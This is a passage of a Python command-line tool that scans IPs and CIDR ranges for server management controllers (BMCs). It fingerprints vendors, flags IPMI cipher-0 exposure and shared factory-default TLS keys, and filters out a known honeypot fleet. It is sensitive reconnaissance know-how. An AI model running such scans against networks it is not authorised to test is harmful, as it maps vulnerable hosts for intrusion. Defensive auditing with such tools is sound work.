        final_label = "no identification possible"
    else:
        # Hard signals = vendor identifications (HTTPS body/headers, Device-ID, GUID).
        # cert_factory is an ATTRIBUTE (cert quality flag), not a vendor — handle separately.
        # Soft signal = tuple (cluster prior). Behavior = class hint (broad).
        hard = [s for s in signals if s[0] in ("https", "https_body", "device_id", "guid_fmt")]
        soft = [s for s in signals if s[0] == "tuple"]
        cert_alert = [s for s in signals if s[0] == "cert_factory"]
        if hard:
            top = max(hard, key=lambda s: s[2])
            supporting = [s for s in hard if s is not top and same_vendor(s[1], top[1])]
            conflicting = [s for s in hard if s is not top and not same_vendor(s[1], top[1])]
            print(f"  primary signal: [{top[0]}] → {top[1]}  conf {fmt_conf(top[2])}")
            if supporting:
                print(f"  other signals confirming same vendor:")
                for s in supporting:
                    print(f"     [{s[0]}] → {s[1]}  conf {fmt_conf(s[2])}")
            if conflicting:
                print(f"  conflicting signals (different vendor — review needed):")
                for s in conflicting:
                    print(f"     [{s[0]}] → {s[1]}  conf {fmt_conf(s[2])}")
            if soft:
                t = soft[0]
                agrees = "agrees" if same_vendor(t[1], top[1]) else "doesn't disambiguate"
                print(f"  tuple cluster ({t[1]}, conf {fmt_conf(t[2])}) {agrees}")
            final_label = top[1]
        elif soft:
            t = soft[0]
            print(f"  primary signal: [tuple] → {t[1]}  conf {fmt_conf(t[2])}")
            print(f"  NOTE: no HTTPS / Device-ID / GUID signal available; vendor")
            print(f"        identification stops at firmware family.")
            final_label  = t[1]
            final_detail = ["(tuple-only — cluster-level firmware family)"]
        else:
            final_label = "unidentified (only behavior class available)"

        if cert_alert:
            print()
            print(f"  ⚠ ALERT: factory-default TLS cert detected")
            print(f"           1024-bit RSA + SHA1 + self-signed → fleet-shared private key")
            print(f"           see: ~/.claude/.../memory/reference_idrac6_factory_cert.md")

    # FINAL line — always last, always preceded by blank line.
    print()
    suffix = ("  " + " ".join(final_detail)) if final_detail else ""
    print(f"  FINAL [{_resolve_target(target)}]: {final_label}{suffix}")


# ──────────────────────── main ────────────────────────

HELP_TEXT = """\
bmc-id — comprehensive unauthenticated BMC identification + vulnerability probe

USAGE
  bmc-id <target> [<target> ...] [options]

TARGETS
  Single IP:    192.168.0.23
  CIDR range:   10.0.0.0/24       (expands to all hosts in range)
  Hostname:     idrac.example.com (resolved via DNS)
  Mix any of the above. Read from stdin if no targets given on argv.

OPTIONS
  -t, --timeout SEC   Per-probe timeout (default 3.0s; iDRAC6 needs ~5)
  -p, --parallel N    Concurrent target scans (default 10)
  -j, --json          JSON output (per-target objects under {"targets": {...}})
  -v, --verbose       Trace each probe to stderr; in parallel mode prefixes lines
                      with [verbose target=IP] for demux
  -q, --quiet         Single TSV line per host: ip\\tvendor\\tconf\\tsource
  --no-https          Skip HTTPS + Redfish probes (UDP-only)
  --no-redfish        Skip Redfish only
  -a, --all-scanned   Emit every target including silent / no-response ones
  -n, --not-bmc       Emit non-BMC responders (honeypots, non-IPMI HTTPS)
                      (default emits only confirmed BMCs)
  --tuple-map PATH    Custom tuple_map.json (default: bundled zipmi/data/zmap-ipmi-decode/)
  --kb-dir PATH       Custom KB dir (default: bundled zipmi/data/zmap-ipmi-decode/kb)
  -h, --help          This help

OUTPUT
  Targets emit in completion order (fastest first), not input order. JSON
  mode wraps as a single object: {"targets": {ip1: {...}, ip2: {...}}}.

EXAMPLES
  bmc-id 192.168.0.23
  bmc-id 10.0.0.0/24 -j -p 20
  bmc-id -j < ips.txt
  bmc-id 192.168.0.23 192.168.0.24 -v 2>verbose.log -j > scan.json
"""


def expand_targets(args: list[str]) -> list[str]:
    """Expand IPs, CIDRs, hostnames into a flat list of target strings.
    CIDR ranges expand to all host addresses (skipping network/broadcast)."""
    out = []
    for a in args:
        if "/" in a:
            try:
                net = ipaddress.ip_network(a, strict=False)
                # For /32 keep just the one; for larger nets, all hosts
                if net.num_addresses == 1:
                    out.append(str(net.network_address))
                else:
                    out.extend(str(ip) for ip in net.hosts())
                continue
            except ValueError:
                pass
        out.append(a)
    # Dedup preserving order
    seen = set(); deduped = []
    for t in out:
        if t not in seen:
            seen.add(t); deduped.append(t)
    return deduped


HONEYPOT_TUPLE = "ch1_a80_s04_e02_o000000"   # Python aiohttp honeypot fleet


def classify_result(ac, did, guid, ciph, c0, v15, v20, https, redfish) -> str:
    """Return one of: bmc | honeypot | non_ipmi_responder | no_response."""
    ipmi_ok = bool(ac) and "error" not in ac
    https_ok = bool(https) and "error" not in https
    if ipmi_ok:
        if ac.get("tuple") == HONEYPOT_TUPLE:
            return "honeypot"
        return "bmc"
    # No IPMI but maybe HTTPS / Redfish / something
    if https_ok or (redfish and "error" not in redfish):
        return "non_ipmi_responder"
    return "no_response"


def process_one(target: str, *, timeout: float, do_https: bool, no_redfish: bool,
                map_path: Path, kb: dict, json_mode: bool) -> dict:
    """Run all probes for one target. Returns dict {target, ok, classification, ...}."""
    _TARGET_TLS.target = target
    try:
        t = Transport(host=target, timeout=timeout)
        ac    = probe_auth_caps(t)
        did   = probe_device_id(t)
        # Short-circuit: no IPMI → only try Redfish (BMC w/ filtered UDP/623 still
        # often answers Redfish). If Redfish also silent → bail. Skip everything else
        # (cipher_suites/cipher0/v15/v20/HTTPS) since they're all useless without IPMI.
        ipmi_silent = (not ac or "error" in ac) and (not did or "error" in did)
        if ipmi_silent:
            vlog("ipmi silent — trying redfish only")
            guid = ciph = c0 = v15 = v20 = https = None
            redfish = probe_redfish(target, timeout) if (do_https and not no_redfish) else None
            if not redfish or "error" in redfish:
                vlog("redfish also silent — stopping")
        else:
            guid  = probe_system_guid(t)
            ciph  = probe_cipher_suites(t)
            c0    = probe_cipher0_active(target, 623, timeout)
            v15   = probe_active_v15(t)
            v20   = probe_active_v20(target, 623, timeout)
            https = probe_https(target, timeout) if do_https else None
            redfish = probe_redfish(target, timeout) if (do_https and not no_redfish) else None

        result = {"target": target}
        answered = sum(1 for x in (ac, did, guid, ciph, v15, v20, c0, https)
                       if x and not x.get("error"))
        result["ok"] = answered > 0
        result["classification"] = classify_result(ac, did, guid, ciph, c0, v15, v20, https, redfish)

        # Per-protocol "support" flags (for summary protocol counts)
        result["protocols_ok"] = {
            "ipmi":      bool(ac) and "error" not in ac,
            "ipmi1.5":   bool(v15 and v15.get("active")),
            "ipmi2.0":   bool(v20 and v20.get("active")),
            "cipher0":   bool(c0 and c0.get("cipher0_exploitable")),
            "https":     bool(https) and "error" not in https,
            "redfish":   bool(redfish) and "error" not in redfish,
        }

        # Vendor + vuln rollups for summary
        if json_mode:
            jd = render_json(target, ac, did, guid, ciph, https, map_path,
                             v15=v15, v20=v20, c0=c0, redfish=redfish, kb=kb)
            result["json_dict"] = jd
            result["_vendor"] = jd.get("conclusion", {}).get("vendor")
            result["_factory_cert"] = bool(jd.get("https:443", {}).get("cert_factory_default"))
        else:
            # Capture text render into buffer for atomic emit
            import io as _io, contextlib as _ctx
            buf = _io.StringIO()
            with _ctx.redirect_stdout(buf):
                render(target, ac, did, guid, ciph, https, map_path,
                       v15=v15, v20=v20, c0=c0, redfish=redfish, kb=kb,
                       do_https=do_https, quiet=QUIET)
            result["text_buf"] = buf.getvalue()
            # Quick extract for summary even in text mode
            entry = lookup_vendor(ac.get("tuple", ""), map_path) if (ac and "error" not in ac) else None
            result["_vendor"] = entry.get("vendor", "?").split()[0] if entry else None
            result["_factory_cert"] = bool(https and https.get("cert_factory_default"))
        return result
    except Exception as e:
        return {"target": target, "ok": False, "classification": "no_response",
                "error": f"{type(e).__name__}: {e}",
                "protocols_ok": {}, "_vendor": None, "_factory_cert": False}
    finally:
        _TARGET_TLS.target = None


def main(argv: list[str] | None = None) -> int:
    """Entry point — works both as `python -m zipmi.cli.bmc_id` and as
    setuptools console_script (which calls main() w/ no args)."""
    if argv is None:
        argv = sys.argv
    global VERBOSE, QUIET
    args = list(argv[1:])
    map_path = DEFAULT_TUPLE_MAP
    kb_dir   = DEFAULT_KB_DIR
    do_https = True
    no_redfish = False
    json_mode = False
    parallel = 10
    timeout  = DEFAULT_TIMEOUT

    def take_val(flag):
        i = args.index(flag); v = args[i + 1]; del args[i:i + 2]; return v

    if "-h" in args or "--help" in args:
        print(HELP_TEXT, file=sys.stderr)
        return 0

    if "--tuple-map" in args:    map_path = Path(take_val("--tuple-map")).expanduser()
    if "--kb-dir"    in args:    kb_dir   = Path(take_val("--kb-dir")).expanduser()
    if "--no-https" in args:     do_https = False; args.remove("--no-https")
    if "--no-redfish" in args:   no_redfish = True; args.remove("--no-redfish")
    if "-v" in args:             VERBOSE = True; args.remove("-v")
    if "--verbose" in args:      VERBOSE = True; args.remove("--verbose")
    if "-q" in args:             QUIET = True; args.remove("-q")
    if "--quiet" in args:        QUIET = True; args.remove("--quiet")
    if "-j" in args:             json_mode = True; args.remove("-j")
    if "--json" in args:         json_mode = True; args.remove("--json")
    if "-t" in args:             timeout = float(take_val("-t"))
    if "--timeout" in args:      timeout = float(take_val("--timeout"))
    if "-p" in args:             parallel = int(take_val("-p"))
    if "--parallel" in args:     parallel = int(take_val("--parallel"))
    output_all = False
    output_non_bmc = False
    if "-a" in args:             output_all = True; args.remove("-a")
    if "--all-scanned" in args:  output_all = True; args.remove("--all-scanned")
    if "-n" in args:             output_non_bmc = True; args.remove("-n")
    if "--not-bmc" in args:      output_non_bmc = True; args.remove("--not-bmc")

    # Targets from argv or stdin
    raw_targets = list(args)
    if not raw_targets and not sys.stdin.isatty():
        raw_targets = [ln.strip() for ln in sys.stdin
                       if ln.strip() and not ln.startswith("#")]
    if not raw_targets:
        _msg.error("no targets given. Try --help")
        return 2

    targets = expand_targets(raw_targets)
    if VERBOSE and not QUIET:
        print(f"expanded {len(raw_targets)} args → {len(targets)} targets, "
              f"parallel={parallel}, timeout={timeout}s", file=sys.stderr)

    kb = load_kb(kb_dir)

    # Dispatch parallel
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import time as _t
    t0 = _t.time()

    if json_mode:
        sys.stdout.write('{\n  "targets": {\n')
        first = True

    # Stats accumulators
    counts = {"scanned": len(targets), "answered": 0, "bmc": 0,
              "honeypot": 0, "non_ipmi_responder": 0, "no_response": 0,
              "cipher0_exploitable": 0, "factory_default_cert": 0}
    proto_counts = {k: 0 for k in ("ipmi", "ipmi1.5", "ipmi2.0", "cipher0", "https", "redfish")}
    vendors_seen = {}     # vendor → host count

    def should_emit(cls: str) -> bool:
        if output_all: return True       # -a: emit everything
        if cls == "bmc": return True
        if cls == "honeypot" and output_non_bmc: return True
        if cls == "non_ipmi_responder" and output_non_bmc: return True
        # default: skip no_response and (without -n) skip non-BMCs
        return False

    with ThreadPoolExecutor(max_workers=max(1, parallel)) as pool:
        futures = {pool.submit(process_one, tgt,
                               timeout=timeout, do_https=do_https,
                               no_redfish=no_redfish, map_path=map_path,
                               kb=kb, json_mode=json_mode): tgt
                   for tgt in targets}
        for fut in as_completed(futures):
            r = fut.result()
            cls = r.get("classification", "no_response")
            counts[cls] = counts.get(cls, 0) + 1
            if r.get("ok"): counts["answered"] += 1
            for proto, ok in (r.get("protocols_ok") or {}).items():
                if ok: proto_counts[proto] = proto_counts.get(proto, 0) + 1
            v = r.get("_vendor")
            if v: vendors_seen[v] = vendors_seen.get(v, 0) + 1
            if r.get("_factory_cert"): counts["factory_default_cert"] += 1
            if r.get("protocols_ok", {}).get("cipher0"):
                counts["cipher0_exploitable"] += 1

            if not should_emit(cls):
                continue

            if json_mode:
                obj = r.get("json_dict", {"error": r.get("error", "no result"),
                                          "classification": cls})
                obj_json = json.dumps(obj, default=str, indent=2)
                indented = "\n".join("    " + ln for ln in obj_json.split("\n"))
                if not first:
                    sys.stdout.write(",\n")
                first = False
                sys.stdout.write(f'    "{r["target"]}": {indented.lstrip()}')
                sys.stdout.flush()
            else:
                if r.get("text_buf"):
                    sys.stdout.write(r["text_buf"])
                elif r.get("error"):
                    print(f"# {r['target']}: ERR {r['error']}", file=sys.stderr)
                sys.stdout.flush()

    elapsed = _t.time() - t0
    h = int(elapsed // 3600); m = int((elapsed % 3600) // 60); s = int(elapsed % 60)
    elapsed_str = f"{h}:{m:02d}:{s:02d}"

    if json_mode:
        sys.stdout.write("\n  },\n")
        summary = {
            "elapsed_time": elapsed_str,
            "elapsed_seconds": round(elapsed, 1),
            "scanned": counts["scanned"],
            "answered": counts["answered"],
            "bmcs": counts["bmc"],
            "honeypots": counts["honeypot"],
            "non_ipmi_responders": counts["non_ipmi_responder"],
            "no_response": counts["no_response"],
            "protocols": proto_counts,
            "vendors": vendors_seen,
            "vulnerabilities": {
                "cipher0_exploitable": counts["cipher0_exploitable"],
                "factory_default_cert": counts["factory_default_cert"],
            },
            "filters": {
                "all_scanned": output_all,
                "include_non_bmc": output_non_bmc,
            },
        }
        sum_json = json.dumps(summary, default=str, indent=2)
        indented = "\n".join("  " + ln for ln in sum_json.split("\n"))
        sys.stdout.write(f'  "summary": {indented.lstrip()}\n}}\n')
        sys.stdout.flush()
    else:
        # Text mode summary footer
        print()
        print(f"━━━ summary ━━━ elapsed={elapsed_str}  scanned={counts['scanned']}  "
              f"bmcs={counts['bmc']}  honeypots={counts['honeypot']}  "
              f"non_ipmi={counts['non_ipmi_responder']}  silent={counts['no_response']}",
              file=sys.stderr)
        print(f"  protocols: " + ", ".join(f"{k}={v}" for k,v in proto_counts.items() if v),
              file=sys.stderr)
        if vendors_seen:
            print(f"  vendors: " + ", ".join(f"{v}={n}" for v,n in sorted(vendors_seen.items(), key=lambda x: -x[1])),
                  file=sys.stderr)
        if counts["cipher0_exploitable"] or counts["factory_default_cert"]:
            print(f"  ⚠ vulns: cipher0_exploitable={counts['cipher0_exploitable']}  "
                  f"factory_cert={counts['factory_default_cert']}", file=sys.stderr)

    return 0 if counts["answered"] > 0 else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
